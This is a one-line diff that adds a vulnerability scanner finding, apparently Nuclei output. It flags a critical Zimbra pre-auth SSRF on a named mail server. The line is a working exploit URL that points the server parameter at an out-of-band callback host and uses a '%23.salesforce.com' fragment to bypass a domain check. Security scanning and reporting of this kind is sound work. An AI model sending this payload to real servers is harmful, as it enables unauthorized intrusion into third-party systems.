@@ -1,0 +1,1 @@
+[zimbra-preauth-ssrf] [http] [critical] https://mail.particle.network/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://d9bfap8226q3f1n3oejga9cpiq1jp8izx.oast.fun%23.salesforce.com/
